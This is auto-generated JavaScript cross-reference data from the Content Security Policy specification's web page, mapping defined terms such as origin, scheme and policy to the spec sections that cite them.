        window.dfnpanelData['5718c334'] = { "dfnID": "5718c334", "url": "https://url.spec.whatwg.org/#dom-url-host", "dfnText": "host (for URL)", "refSections": [{ "refs": [{ "id": "ref-for-dom-url-host" }, { "id": "ref-for-dom-url-host\u2460" }, { "id": "ref-for-dom-url-host\u2461" }, { "id": "ref-for-dom-url-host\u2462" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }], "external": true };
        window.dfnpanelData['959ad97b'] = { "dfnID": "959ad97b", "url": "https://url.spec.whatwg.org/#concept-url-origin", "dfnText": "origin", "refSections": [{ "refs": [{ "id": "ref-for-concept-url-origin" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-concept-url-origin\u2460" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }], "external": true };
        window.dfnpanelData['a1288f2a'] = { "dfnID": "a1288f2a", "url": "https://url.spec.whatwg.org/#concept-url-password", "dfnText": "password", "refSections": [{ "refs": [{ "id": "ref-for-concept-url-password" }], "title": "5.4. Strip URL for use in reports" }], "external": true };
        window.dfnpanelData['c0868016'] = { "dfnID": "c0868016", "url": "https://url.spec.whatwg.org/#concept-url-path", "dfnText": "path", "refSections": [{ "refs": [{ "id": "ref-for-concept-url-path" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-concept-url-path\u2460" }], "title": "6.7.2.12. \n    path-part matching\n  " }], "external": true };
        window.dfnpanelData['8f69ce41'] = { "dfnID": "8f69ce41", "url": "https://url.spec.whatwg.org/#string-percent-decode", "dfnText": "percent-decode", "refSections": [{ "refs": [{ "id": "ref-for-string-percent-decode" }, { "id": "ref-for-string-percent-decode\u2460" }], "title": "6.7.2.12. \n    path-part matching\n  " }], "external": true };
        window.dfnpanelData['17bd86ff'] = { "dfnID": "17bd86ff", "url": "https://url.spec.whatwg.org/#dom-url-port", "dfnText": "port (for URL)", "refSections": [{ "refs": [{ "id": "ref-for-dom-url-port" }, { "id": "ref-for-dom-url-port\u2460" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }], "external": true };
        window.dfnpanelData['852ada56'] = { "dfnID": "852ada56", "url": "https://url.spec.whatwg.org/#concept-url-port", "dfnText": "port (for url)", "refSections": [{ "refs": [{ "id": "ref-for-concept-url-port" }, { "id": "ref-for-concept-url-port\u2460" }, { "id": "ref-for-concept-url-port\u2461" }], "title": "6.7.2.11. \n    port-part matching\n  " }], "external": true };
        window.dfnpanelData['3a711be7'] = { "dfnID": "3a711be7", "url": "https://url.spec.whatwg.org/#concept-url-scheme", "dfnText": "scheme", "refSections": [{ "refs": [{ "id": "ref-for-concept-url-scheme" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-url-scheme\u2460" }, { "id": "ref-for-concept-url-scheme\u2461" }], "title": "5.4. Strip URL for use in reports" }, { "refs": [{ "id": "ref-for-concept-url-scheme\u2462" }, { "id": "ref-for-concept-url-scheme\u2463" }, { "id": "ref-for-concept-url-scheme\u2464" }, { "id": "ref-for-concept-url-scheme\u2465" }, { "id": "ref-for-concept-url-scheme\u2466" }, { "id": "ref-for-concept-url-scheme\u2467" }, { "id": "ref-for-concept-url-scheme\u2468" }, { "id": "ref-for-concept-url-scheme\u2460\u24ea" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-concept-url-scheme\u2460\u2460" }], "title": "6.7.2.9. \n    scheme-part matching\n  " }, { "refs": [{ "id": "ref-for-concept-url-scheme\u2460\u2461" }, { "id": "ref-for-concept-url-scheme\u2460\u2462" }], "title": "6.7.2.11. \n    port-part matching\n  " }], "external": true };
        window.dfnpanelData['dcffbccd'] = { "dfnID": "dcffbccd", "url": "https://url.spec.whatwg.org/#concept-url", "dfnText": "url", "refSections": [{ "refs": [{ "id": "ref-for-concept-url" }, { "id": "ref-for-concept-url\u2460" }], "title": "5.2. \n    Obtain the blockedURI of a violation\u2019s resource\n  " }, { "refs": [{ "id": "ref-for-concept-url\u2461" }], "title": "5.4. Strip URL for use in reports" }, { "refs": [{ "id": "ref-for-concept-url\u2462" }], "title": "6.7.2.11. \n    port-part matching\n  " }], "external": true };
        window.dfnpanelData['ca3ca4ae'] = { "dfnID": "ca3ca4ae", "url": "https://url.spec.whatwg.org/#concept-url-parser", "dfnText": "url parser", "refSections": [{ "refs": [{ "id": "ref-for-concept-url-parser" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-concept-url-parser\u2460" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }], "external": true };
        window.dfnpanelData['5442ea33'] = { "dfnID": "5442ea33", "url": "https://url.spec.whatwg.org/#concept-url-serializer", "dfnText": "url serializer", "refSections": [{ "refs": [{ "id": "ref-for-concept-url-serializer" }], "title": "5.4. Strip URL for use in reports" }], "external": true };
        window.dfnpanelData['218c9455'] = { "dfnID": "218c9455", "url": "https://url.spec.whatwg.org/#concept-url-username", "dfnText": "username", "refSections": [{ "refs": [{ "id": "ref-for-concept-url-username" }], "title": "5.4. Strip URL for use in reports" }], "external": true };
        window.dfnpanelData['955b99c4'] = { "dfnID": "955b99c4", "url": "https://webassembly.github.io/spec/js-api/#exceptiondef-compileerror", "dfnText": "WebAssembly.CompileError", "refSections": [{ "refs": [{ "id": "ref-for-exceptiondef-compileerror" }, { "id": "ref-for-exceptiondef-compileerror\u2460" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }], "external": true };
        window.dfnpanelData['60675e26'] = { "dfnID": "60675e26", "url": "https://webassembly.github.io/spec/js-api/#dom-webassembly-compile", "dfnText": "WebAssembly.compile()", "refSections": [{ "refs": [{ "id": "ref-for-dom-webassembly-compile" }], "title": "6.1.10. script-src" }], "external": true };
        window.dfnpanelData['a56b2832'] = { "dfnID": "a56b2832", "url": "https://webassembly.github.io/spec/js-api/#dom-webassembly-instantiate", "dfnText": "WebAssembly.instantiate()", "refSections": [{ "refs": [{ "id": "ref-for-dom-webassembly-instantiate" }], "title": "6.1.10. script-src" }], "external": true };
        window.dfnpanelData['6819dc54'] = { "dfnID": "6819dc54", "url": "https://webassembly.github.io/spec/js-api/#dom-module-module", "dfnText": "new WebAssembly.Module()", "refSections": [{ "refs": [{ "id": "ref-for-dom-module-module" }], "title": "6.1.10. script-src" }], "external": true };
        window.dfnpanelData['784d7d80'] = { "dfnID": "784d7d80", "url": "https://webassembly.github.io/content-security-policy/js-api/#host-ensure-can-compile-wasm-bytes", "dfnText": "HostEnsureCanCompileWasmBytes()", "refSections": [{ "refs": [{ "id": "ref-for-host-ensure-can-compile-wasm-bytes" }], "title": "4.5. Integration with WebAssembly" }], "external": true };
        window.dfnpanelData['53f02be3'] = { "dfnID": "53f02be3", "url": "https://webassembly.github.io/spec/web-api/#dom-webassembly-compilestreaming", "dfnText": "WebAssembly.compileStreaming()", "refSections": [{ "refs": [{ "id": "ref-for-dom-webassembly-compilestreaming" }], "title": "6.1.10. script-src" }], "external": true };
        window.dfnpanelData['2a675f38'] = { "dfnID": "2a675f38", "url": "https://webassembly.github.io/spec/web-api/#dom-webassembly-instantiatestreaming", "dfnText": "WebAssembly.instantiateStreaming()", "refSections": [{ "refs": [{ "id": "ref-for-dom-webassembly-instantiatestreaming" }], "title": "6.1.10. script-src" }], "external": true };
        window.dfnpanelData['8855a9aa'] = { "dfnID": "8855a9aa", "url": "https://webidl.spec.whatwg.org/#idl-DOMString", "dfnText": "DOMString", "refSections": [{ "refs": [{ "id": "ref-for-idl-DOMString" }, { "id": "ref-for-idl-DOMString\u2460" }, { "id": "ref-for-idl-DOMString\u2461" }], "title": "5. \n    Reporting\n  " }, { "refs": [{ "id": "ref-for-idl-DOMString\u2462" }, { "id": "ref-for-idl-DOMString\u2463" }, { "id": "ref-for-idl-DOMString\u2464" }, { "id": "ref-for-idl-DOMString\u2465" }, { "id": "ref-for-idl-DOMString\u2466" }, { "id": "ref-for-idl-DOMString\u2467" }, { "id": "ref-for-idl-DOMString\u2468" }, { "id": "ref-for-idl-DOMString\u2460\u24ea" }, { "id": "ref-for-idl-DOMString\u2460\u2460" }], "title": "5.1. \n    Violation DOM Events\n  " }], "external": true };
        window.dfnpanelData['f4531911'] = { "dfnID": "f4531911", "url": "https://webidl.spec.whatwg.org/#Default", "dfnText": "Default", "refSections": [{ "refs": [{ "id": "ref-for-Default" }], "title": "5. \n    Reporting\n  " }], "external": true };
        window.dfnpanelData['522350fb'] = { "dfnID": "522350fb", "url": "https://webidl.spec.whatwg.org/#exceptiondef-evalerror", "dfnText": "EvalError", "refSections": [{ "refs": [{ "id": "ref-for-exceptiondef-evalerror" }, { "id": "ref-for-exceptiondef-evalerror\u2460" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }], "external": true };
        window.dfnpanelData['889e932f'] = { "dfnID": "889e932f", "url": "https://webidl.spec.whatwg.org/#Exposed", "dfnText": "Exposed", "refSections": [{ "refs": [{ "id": "ref-for-Exposed" }], "title": "5. \n    Reporting\n  " }, { "refs": [{ "id": "ref-for-Exposed\u2460" }], "title": "5.1. \n    Violation DOM Events\n  " }], "external": true };
        window.dfnpanelData['b0d7f3c3'] = { "dfnID": "b0d7f3c3", "url": "https://webidl.spec.whatwg.org/#idl-USVString", "dfnText": "USVString", "refSections": [{ "refs": [{ "id": "ref-for-idl-USVString" }, { "id": "ref-for-idl-USVString\u2460" }, { "id": "ref-for-idl-USVString\u2461" }, { "id": "ref-for-idl-USVString\u2462" }], "title": "5. \n    Reporting\n  " }, { "refs": [{ "id": "ref-for-idl-USVString\u2463" }, { "id": "ref-for-idl-USVString\u2464" }, { "id": "ref-for-idl-USVString\u2465" }, { "id": "ref-for-idl-USVString\u2466" }, { "id": "ref-for-idl-USVString\u2467" }, { "id": "ref-for-idl-USVString\u2468" }, { "id": "ref-for-idl-USVString\u2460\u24ea" }, { "id": "ref-for-idl-USVString\u2460\u2460" }], "title": "5.1. \n    Violation DOM Events\n  " }], "external": true };
        window.dfnpanelData['a32c65d4'] = { "dfnID": "a32c65d4", "url": "https://webidl.spec.whatwg.org/#implements", "dfnText": "implements", "refSections": [{ "refs": [{ "id": "ref-for-implements" }, { "id": "ref-for-implements\u2460" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-implements\u2461" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['56f81a8e'] = { "dfnID": "56f81a8e", "url": "https://webidl.spec.whatwg.org/#new", "dfnText": "new", "refSections": [{ "refs": [{ "id": "ref-for-new" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }], "external": true };
        window.dfnpanelData['efd1ec5d'] = { "dfnID": "efd1ec5d", "url": "https://webidl.spec.whatwg.org/#idl-object", "dfnText": "object", "refSections": [{ "refs": [{ "id": "ref-for-idl-object" }], "title": "5. \n    Reporting\n  " }], "external": true };
        window.dfnpanelData['e97a9688'] = { "dfnID": "e97a9688", "url": "https://webidl.spec.whatwg.org/#idl-unsigned-long", "dfnText": "unsigned long", "refSections": [{ "refs": [{ "id": "ref-for-idl-unsigned-long" }, { "id": "ref-for-idl-unsigned-long\u2460" }], "title": "5. \n    Reporting\n  " }, { "refs": [{ "id": "ref-for-idl-unsigned-long\u2461" }, { "id": "ref-for-idl-unsigned-long\u2462" }, { "id": "ref-for-idl-unsigned-long\u2463" }, { "id": "ref-for-idl-unsigned-long\u2464" }], "title": "5.1. \n    Violation DOM Events\n  " }], "external": true };
        window.dfnpanelData['450958f7'] = { "dfnID": "450958f7", "url": "https://webidl.spec.whatwg.org/#idl-unsigned-short", "dfnText": "unsigned short", "refSections": [{ "refs": [{ "id": "ref-for-idl-unsigned-short" }], "title": "5. \n    Reporting\n  " }, { "refs": [{ "id": "ref-for-idl-unsigned-short\u2460" }, { "id": "ref-for-idl-unsigned-short\u2461" }], "title": "5.1. \n    Violation DOM Events\n  " }], "external": true };
        window.dfnpanelData['f48ea995'] = { "dfnID": "f48ea995", "url": "https://www.w3.org/TR/webrtc/#dfn-administratively-prohibited", "dfnText": "administratively-prohibited", "refSections": [{ "refs": [{ "id": "ref-for-dfn-administratively-prohibited" }], "title": "4.3. Integration with WebRTC" }], "external": true };
        window.dfnpanelData['content-security-policy'] = { "dfnID": "content-security-policy", "url": "#content-security-policy", "dfnText": "Content Security Policy", "refSections": [{ "refs": [{ "id": "ref-for-content-security-policy" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }], "external": false };
        window.dfnpanelData['grammardef-optional-ascii-whitespace'] = { "dfnID": "grammardef-optional-ascii-whitespace", "url": "#grammardef-optional-ascii-whitespace", "dfnText": "optional-ascii-whitespace", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-optional-ascii-whitespace" }, { "id": "ref-for-grammardef-optional-ascii-whitespace\u2460" }, { "id": "ref-for-grammardef-optional-ascii-whitespace\u2461" }, { "id": "ref-for-grammardef-optional-ascii-whitespace\u2462" }, { "id": "ref-for-grammardef-optional-ascii-whitespace\u2463" }], "title": "2.1. Infrastructure" }, { "refs": [{ "id": "ref-for-grammardef-optional-ascii-whitespace\u2464" }, { "id": "ref-for-grammardef-optional-ascii-whitespace\u2465" }], "title": "2.2. Policies" }], "external": false };
        window.dfnpanelData['grammardef-required-ascii-whitespace'] = { "dfnID": "grammardef-required-ascii-whitespace", "url": "#grammardef-required-ascii-whitespace", "dfnText": "required-ascii-whitespace", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-required-ascii-whitespace" }, { "id": "ref-for-grammardef-required-ascii-whitespace\u2460" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-grammardef-required-ascii-whitespace\u2461" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-required-ascii-whitespace\u2462" }], "title": "6.3.2. sandbox" }, { "refs": [{ "id": "ref-for-grammardef-required-ascii-whitespace\u2463" }], "title": "6.4.2. frame-ancestors" }, { "refs": [{ "id": "ref-for-grammardef-required-ascii-whitespace\u2464" }], "title": "6.5.1. report-uri" }], "external": false };
        window.dfnpanelData['content-security-policy-object'] = { "dfnID": "content-security-policy-object", "url": "#content-security-policy-object", "dfnText": "policy", "refSections": [{ "refs": [{ "id": "ref-for-content-security-policy-object" }, { "id": "ref-for-content-security-policy-object\u2460" }, { "id": "ref-for-content-security-policy-object\u2461" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462" }, { "id": "ref-for-content-security-policy-object\u2463" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465" }, { "id": "ref-for-content-security-policy-object\u2466" }, { "id": "ref-for-content-security-policy-object\u2467" }, { "id": "ref-for-content-security-policy-object\u2468" }, { "id": "ref-for-content-security-policy-object\u2460\u24ea" }, { "id": "ref-for-content-security-policy-object\u2460\u2460" }, { "id": "ref-for-content-security-policy-object\u2460\u2461" }, { "id": "ref-for-content-security-policy-object\u2460\u2462" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2460\u2463" }, { "id": "ref-for-content-security-policy-object\u2460\u2464" }, { "id": "ref-for-content-security-policy-object\u2460\u2465" }, { "id": "ref-for-content-security-policy-object\u2460\u2466" }], "title": "2.4. Violations" }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2460\u2467" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2460\u2468" }], "title": "2.4.2. \n    Create a violation object for request, and policy.\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2461\u24ea" }, { "id": "ref-for-content-security-policy-object\u2461\u2460" }], "title": "3. \n    Policy Delivery\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2461\u2461" }, { "id": "ref-for-content-security-policy-object\u2461\u2462" }, { "id": "ref-for-content-security-policy-object\u2461\u2463" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2461\u2464" }, { "id": "ref-for-content-security-policy-object\u2461\u2465" }], "title": "5. \n    Reporting\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2461\u2466" }], "title": "6.1.1.1. \n    child-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2461\u2467" }], "title": "6.1.1.2. \n    child-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2461\u2468" }], "title": "6.1.2.1. \n    connect-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u24ea" }], "title": "6.1.2.2. \n    connect-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u2460" }], "title": "6.1.3.1. \n    default-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u2461" }], "title": "6.1.3.2. \n    default-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u2462" }], "title": "6.1.3.3. \n    default-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u2463" }], "title": "6.1.4.1. \n    font-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u2464" }], "title": "6.1.4.2. \n    font-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u2465" }], "title": "6.1.5.1. \n    frame-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u2466" }], "title": "6.1.5.2. \n    frame-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u2467" }], "title": "6.1.6.1. \n    img-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2462\u2468" }], "title": "6.1.6.2. \n    img-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u24ea" }], "title": "6.1.7.1. \n    manifest-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u2460" }], "title": "6.1.7.2. \n    manifest-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u2461" }], "title": "6.1.8.1. \n    media-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u2462" }], "title": "6.1.8.2. \n    media-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u2463" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u2464" }], "title": "6.1.9.1. \n    object-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u2465" }], "title": "6.1.9.2. \n    object-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u2466" }], "title": "6.1.10.1. \n    script-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u2467" }], "title": "6.1.10.2. \n    script-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2463\u2468" }], "title": "6.1.10.3. \n    script-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u24ea" }], "title": "6.1.11.1. \n    script-src-elem Pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u2460" }], "title": "6.1.11.2. \n    script-src-elem Post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u2461" }], "title": "6.1.11.3. \n    script-src-elem Inline Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u2462" }], "title": "6.1.12.1. \n    script-src-attr Inline Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u2463" }], "title": "6.1.13.1. \n    style-src Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u2464" }], "title": "6.1.13.2. \n    style-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u2465" }], "title": "6.1.13.3. \n    style-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u2466" }], "title": "6.1.14.1. \n    style-src-elem Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u2467" }], "title": "6.1.14.2. \n    style-src-elem Post-request Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2464\u2468" }], "title": "6.1.14.3. \n    style-src-elem Inline Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u24ea" }], "title": "6.1.15.1. \n    style-src-attr Inline Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u2460" }], "title": "6.2.2.1. \n    worker-src Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u2461" }], "title": "6.2.2.2. \n    worker-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u2462" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u2463" }], "title": "6.4.1.1. \n    form-action Pre-Navigation Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u2464" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u2465" }], "title": "6.4.2.2. \n    Relation to ``X-Frame-Options``\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u2466" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u2467" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2465\u2468" }], "title": "6.7.2.1. \n    Does request violate policy?\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2466\u24ea" }], "title": "6.7.2.2. \n    Does resource hint request violate policy?\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2466\u2460" }], "title": "6.7.2.5. \n    Does request match source list?\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2466\u2461" }], "title": "6.7.2.6. \n    Does response to request match source list?\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2466\u2462" }], "title": "6.8.4. \n    Should fetch directive execute\n  " }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2466\u2463" }], "title": "7.1. Nonce Reuse" }, { "refs": [{ "id": "ref-for-content-security-policy-object\u2466\u2464" }], "title": "9.1. Vendor-specific Extensions and Addons" }], "external": false };
        window.dfnpanelData['policy-directive-set'] = { "dfnID": "policy-directive-set", "url": "#policy-directive-set", "dfnText": "directive set", "refSections": [{ "refs": [{ "id": "ref-for-policy-directive-set" }, { "id": "ref-for-policy-directive-set\u2460" }, { "id": "ref-for-policy-directive-set\u2461" }, { "id": "ref-for-policy-directive-set\u2462" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-policy-directive-set\u2463" }, { "id": "ref-for-policy-directive-set\u2464" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-policy-directive-set\u2465" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-policy-directive-set\u2466" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-policy-directive-set\u2467" }, { "id": "ref-for-policy-directive-set\u2468" }, { "id": "ref-for-policy-directive-set\u2460\u24ea" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-policy-directive-set\u2460\u2460" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }], "external": false };
        window.dfnpanelData['policy-disposition'] = { "dfnID": "policy-disposition", "url": "#policy-disposition", "dfnText": "disposition", "refSections": [{ "refs": [{ "id": "ref-for-policy-disposition" }, { "id": "ref-for-policy-disposition\u2460" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2461" }, { "id": "ref-for-policy-disposition\u2462" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2463" }], "title": "2.4. Violations" }, { "refs": [{ "id": "ref-for-policy-disposition\u2464" }], "title": "4.1.1. \n    Report Content Security Policy violations for request\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2465" }], "title": "4.1.2. \n    Should request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2466" }], "title": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2467" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2468" }, { "id": "ref-for-policy-disposition\u2460\u24ea" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2460\u2460" }, { "id": "ref-for-policy-disposition\u2460\u2461" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2460\u2462" }], "title": "4.3.1. \n    Should RTC connections be blocked for global?\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2460\u2463" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2460\u2464" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-policy-disposition\u2460\u2465" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2460\u2466" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2460\u2467" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }, { "refs": [{ "id": "ref-for-policy-disposition\u2460\u2468" }], "title": "6.4.2.2. \n    Relation to ``X-Frame-Options``\n  " }], "external": false };
        window.dfnpanelData['policy-source'] = { "dfnID": "policy-source", "url": "#policy-source", "dfnText": "source", "refSections": [{ "refs": [{ "id": "ref-for-policy-source" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-policy-source\u2460" }, { "id": "ref-for-policy-source\u2461" }], "title": "2.2.1. \n    Parse a serialized CSP\n  " }, { "refs": [{ "id": "ref-for-policy-source\u2462" }, { "id": "ref-for-policy-source\u2463" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }], "external": false };
        window.dfnpanelData['policy-self-origin'] = { "dfnID": "policy-self-origin", "url": "#policy-self-origin", "dfnText": "self-origin", "refSections": [{ "refs": [{ "id": "ref-for-policy-self-origin" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-policy-self-origin\u2460" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-policy-self-origin\u2461" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }, { "refs": [{ "id": "ref-for-policy-self-origin\u2462" }], "title": "6.7.2.5. \n    Does request match source list?\n  " }, { "refs": [{ "id": "ref-for-policy-self-origin\u2463" }], "title": "6.7.2.6. \n    Does response to request match source list?\n  " }], "external": false };
        window.dfnpanelData['csp-list'] = { "dfnID": "csp-list", "url": "#csp-list", "dfnText": "CSP list", "refSections": [{ "refs": [{ "id": "ref-for-csp-list" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-csp-list\u2460" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }], "external": false };
        window.dfnpanelData['contains-a-header-delivered-content-security-policy'] = { "dfnID": "contains-a-header-delivered-content-security-policy", "url": "#contains-a-header-delivered-content-security-policy", "dfnText": "contains a header-delivered Content Security Policy", "refSections": [{ "refs": [{ "id": "ref-for-contains-a-header-delivered-content-security-policy" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }], "external": false };
